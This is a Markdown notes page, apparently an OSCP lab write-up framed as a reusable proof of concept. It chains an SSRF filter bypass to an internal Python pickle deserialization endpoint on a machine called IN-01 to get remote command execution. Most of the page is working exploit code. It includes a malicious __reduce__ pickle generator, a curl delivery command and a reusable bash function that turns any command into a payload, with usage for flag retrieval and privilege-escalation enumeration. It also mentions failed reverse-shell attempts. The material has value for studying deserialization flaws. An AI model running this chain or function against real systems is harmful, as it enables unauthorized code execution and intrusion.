---
type: reusable-poc
project: OSCP-Exam-PoC
status: validated
updated: "2026-11-06"
related_machines:
  - IN-01
tags:
  - oscp
  - python-pickle
  - insecure-deserialization
  - ssrf
  - rce
  - in-band-command-execution
---
# Python Pickle RCE

## Overview

**Objective:** Achieve remote command execution through an internal Python deserialization endpoint exposed indirectly through an SSRF vulnerability.

**Affected machine:** IN-01

**Execution context:** `web` (UID/GID 1000)

**Execution method:** In-band command execution. Commands execute on the target and their output is returned in the HTTP response.

**Status:** Validated. Remote command execution was confirmed.

## Confirmed Attack Chain

<figure class="poc-blueprint-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/poc-blueprint-python-pickle-rce-mobile.svg" />
    <img src="/diagrams/poc-blueprint-python-pickle-rce.svg" alt="PYTHON PICKLE reusable exploitation blueprint: Kali then Public application: /fetch?url= then Internal API: 127.1:9000/admin/exec then Base64 decoding then Python pickle deserialization then eval() -&gt; subprocess.run() then Remote command execution as web then Command output returned through HTTP. . HTTP request; SSRF filter bypass using 127.1; data=&lt;Base64-encoded pickle&gt;; Malicious __reduce__ implementation." width="960" height="865" loading="lazy" decoding="async" />
  </picture>
  <figcaption>PYTHON PICKLE — technical exploitation blueprint, preserving the original sequence, and labeled HTTP/data-transfer edges. Supporting commands and evidence remain in this page.</figcaption>
</figure>

The SSRF filter bypass is documented separately in:

[[Reusable PoCs/SSRF/SSRF Filter Bypass]]

## Endpoint and Input Behavior

|Component|Confirmed value|
|---|---|
|Public endpoint|`/fetch`|
|Internal API|`http://127.1:9000/admin/exec`|
|HTTP method|GET|
|Input parameter|`data`|
|Input encoding|Base64|
|Serialization format|Python Pickle|
|Execution account|`web`|
|UID/GID|`1000:1000`|
|Working directory|`/opt/app`|

### Error-based identification

The following responses helped establish the input-processing behavior:

|Request|Response|Interpretation|
|---|---|---|
|`/admin/exec` without `data`|HTTP 400 — `Ran out of input`|Empty input reached the deserializer|
|`/admin/exec?data=x`|HTTP 400 — invalid Base64 length|The parameter is Base64-decoded|
|`/admin/exec?data=`|HTTP 400 — `Ran out of input`|Empty decoded input reaches the deserializer|

The errors alone were not proof of code execution. The malicious pickle payload subsequently confirmed it.

## Exploitation

### 1. Generate the malicious pickle

The payload uses Python's `__reduce__` mechanism to invoke `eval()` during deserialization.

The evaluated expression executes an operating-system command through `subprocess`.

```
import base64
import pickle

class Exploit:
    def __reduce__(self):
        return (
            eval,
            ("__import__('subprocess').check_output('id; whoami; pwd', shell=True, text=True)",)
        )

print(base64.b64encode(pickle.dumps(Exploit(), protocol=4)).decode())
```

### 2. Deliver the payload through the SSRF endpoint

Use the generated Base64 value as the internal API's `data` parameter.

The outer request sends the internal URL through the public `/fetch` endpoint:

```
curl -sS --max-time 10 -G \
  --data-urlencode "url=http://127.1:9000/admin/exec?data=$DATA" \
  'http://PUBLIC_IP:HTTP_PORT/fetch'
```

Replace `PUBLIC_IP` and `HTTP_PORT` with the current lab instance details.

### 3. Confirm execution

The following commands were executed remotely:

```
id
whoami
pwd
```

**Confirmed response:**

```
'uid=1000(web) gid=1000(web) groups=1000(web)\nweb\n/opt/app\n'
```

This confirms successful remote command execution as `web`.

## Reusable In-Band Execution Function

The following function generates a malicious pickle for each command, Base64-encodes it, URL-encodes the nested `data` parameter, and sends the request through the public SSRF endpoint.

The nested URL encoding is important. Base64 values can contain `+`, `/`, and `=`. Failing to encode the nested parameter separately can corrupt the payload when the internal API parses its query string.

```
ssrf_exec() {
    local remote_cmd="${1:?Usage: ssrf_exec '<command>' '<public-fetch-url>'}"
    local target="${2:?Usage: ssrf_exec '<command>' '<public-fetch-url>'}"
    local data
    local enc_data
    local internal_url

    # Generate the malicious pickle and Base64-encode it.
    data=$(
        REMOTE_CMD="$remote_cmd" python3 - <<'PY'
import os
import base64
import pickle

class Exploit:
    def __reduce__(self):
        command = os.environ["REMOTE_CMD"]
        expression = (
            "__import__('subprocess').run("
            + repr(command)
            + ", shell=True, stdout=-1, stderr=-2, text=True).stdout"
        )
        return eval, (expression,)

print(base64.b64encode(
    pickle.dumps(Exploit(), protocol=4)
).decode())
PY
    ) || return 1

    # Encode the nested data parameter separately.
    enc_data=$(
        DATA="$data" python3 - <<'PY'
import os
from urllib.parse import quote

print(quote(os.environ["DATA"], safe=""))
PY
    ) || return 1

    # Construct the internal URL.
    internal_url="http://127.1:9000/admin/exec?data=${enc_data}"

    # Send the internal URL through the public SSRF endpoint.
    curl -sS --max-time 12 -G \
        --data-urlencode "url=${internal_url}" \
        "$target"

    printf '\n'
}
```

### Usage

Set the current public endpoint:

```
TARGET='http://PUBLIC_IP:HTTP_PORT/fetch'
```

Verify execution:

```
ssrf_exec 'id; whoami; pwd' "$TARGET"
```

Retrieve the user flag:

```
ssrf_exec 'cat /home/$(whoami)/user.txt' "$TARGET"
```

Execute additional enumeration commands:

```
ssrf_exec 'sudo -n -l; find / -perm -4000 -type f 2>/dev/null' "$TARGET"
```

The function does not establish an interactive shell. It executes each supplied command and returns its output through HTTP.

## Reverse Shell Attempts

Reverse-shell callbacks were attempted using both VPN interface addresses observed on Kali:

|Interface|Callback IP|Result|
|---|---|---|
|`tun1`|`10.144.220.24`|No incoming connection|
|`tun0`|`10.10.17.123`|No incoming connection|

The listener was started on TCP port `4444`, and the target-side reverse-shell commands were submitted through the working pickle execution primitive.

**Result:** No reverse shell was established.

The VPN routing configuration was suspected, but the exact reason for the failed callbacks was not established.

This does **not** mean RCE failed. The in-band command-execution primitive remained functional and was sufficient to continue the machine.

### Important distinction

- Python pickle deserialization leading to RCE: **successful**.
    
- Execution as `web`: **confirmed**.
    
- Reverse-shell callback: **unsuccessful**.
    
- VPN routing as the cause: **unconfirmed**.
    

Do not record this machine as having failed RCE.

## Technical Lessons

1. **Untrusted pickle deserialization is dangerous.** Deserializing attacker-controlled pickle data can execute code through callable reconstruction mechanisms such as `__reduce__`.
    
2. **Error messages expose processing stages.** The Base64 validation error and pickle-style EOF error helped identify the input format and processing sequence.
    
3. **Nested URL encoding matters.** Encode the Base64 parameter before embedding it in the internal URL, then encode the complete internal URL as the public `url` parameter.
    
4. **RCE does not require a reverse shell.** When outbound connectivity is unavailable or unreliable, returning command output through the vulnerable application is a viable execution channel.
    
5. **Separate exploit success from callback success.** A failed reverse shell does not invalidate an independently confirmed RCE primitive.
    

## Reusable Checklist

- Identify the public SSRF endpoint.
    
- Identify an accessible internal service.
    
- Discover the deserialization endpoint and expected parameter.
    
- Confirm the encoding and serialization format.
    
- Generate a malicious pickle payload.
    
- Preserve Base64 characters through nested URL encoding.
    
- Confirm remote execution with `id`, `whoami`, and `pwd`.
    
- Retrieve `user.txt`.
    
- Enumerate privilege escalation through the same in-band execution method.
    
- Verify root privileges.
    
- Retrieve `/root/root.txt`.